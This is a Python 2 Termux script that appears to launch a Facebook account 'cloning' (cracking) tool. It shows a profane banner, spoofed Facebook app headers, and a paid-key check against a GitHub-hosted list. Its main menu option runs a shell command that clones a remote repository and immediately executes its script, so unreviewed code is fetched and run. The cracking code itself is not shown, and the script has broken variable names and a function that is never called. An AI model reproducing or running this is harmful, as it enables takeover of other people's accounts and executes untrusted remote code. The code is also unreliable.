#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written (IMTIAZ ALI ARADIN)
import os, time, uuid, requests
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

agents = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = """
33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m\n \033[0m================================================================\n\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO\n\033[0;33mGITHUB : \033[1;97mhttps://github.com/MAHDI-Shuvo\nLIVE in Sylhet (Read in class 10)\n\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU\n ===============================================================
\033[1;91m-----------------------------------------------------
 \033[1;91m(*)\033[1;95m Developer: ◠◡♥♥  MAHDI HASAN   ♥♥◡◠
 \033[1;92m(*)\033[1;94m Facebook : ◠◡♥♥ MAHDI HASAN (SHUVO) ♥♥◡◠
 \033[1;93m(*)\033[1;93m Github   : ◠◡♥♥  MAHDI-Shuvo   ♥♥◡◠
 \033[1;97m(*)\033[1;96m Helper   : ◠◡♥♥ OWN ♥♥◠◡
 \033[1;94m(*)\033[1;92m
 \033[1;95m(*)\033[1;91m  ✯ 🅐︎🅡︎🅐︎🅓︎🅘︎🅝︎ Ⓚ︎Ⓘ︎Ⓝ︎Ⓖ︎ 🅑︎🅞︎🅛︎🅣︎🅔︎ Ⓟ︎Ⓤ︎Ⓑ︎Ⓛ︎Ⓘ︎Ⓒ︎ ✯
\033[1;91m-----------------------------------------------------
"""
def main_apv():
    imt=" -mahdi"
    os.system('clear')
    print logo
    try:
        key1=open("/sdcard/imt.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        print ("You dont have subscrption")
        print ("Hello Dear Ya Cammonds Paid Han Or Ap Ke Subscription Nhi Ha Please Ap Admin Sa Rabta Kran Thanks")
        print (" Subscription Kelya Enter Press Kro Or Whatsapp Pa Rabta Kro Thanks")
        myid=uuid.uuid4().hex[:8]
        print ("Your key : "+MYID+IMT)
        print ("jo mrzi likh lena")
        kok=open("/sdcard/imt.txt",'w')
        kok.write(MYID+IMT)
        kok.close()
        raw_input("press enter go to admin")
        os.system("xdg-open https://wa.me/+8801887408882")

    r1=requests.get("https://raw.githubusercontent.com/MAHDI-Shuvo/mahdipaid/main/mahdi.text").text
    if key1 in r1:
        tool()
    else:
        os.system("clear")
        print logo
        print ("You dont have subscrption")
        print ("Hello Dear This Cammonds is Paid ,So friest toy need premishon on the admin Thank you all")
        print (" Subscription Kelya Enter Press Or contract Whatsapp   Thanks ypu all")
        print ("Your key : "+key1)
        print ("jo mrzi likh lena")
        raw_input("Agar Ap Na Subscription Kar Le Ha To Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio Thanks")
        os.system("xdg-open https://wa.me/+8801887408882")
        
print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
\033[0m================================================================
\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
\033[0;33mGITHUB : \033[1;97mhttps://github.com/MAHDI-Shuvo
LIVE in Sylhet (Read in class 10)
\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
================================================================""")
print("""
\033[0;36m[1]Start cloning
\033[0;88m[2]GO BACK""")
pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

if pil in ["01", "1"]:

    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python mahdi.py')
    
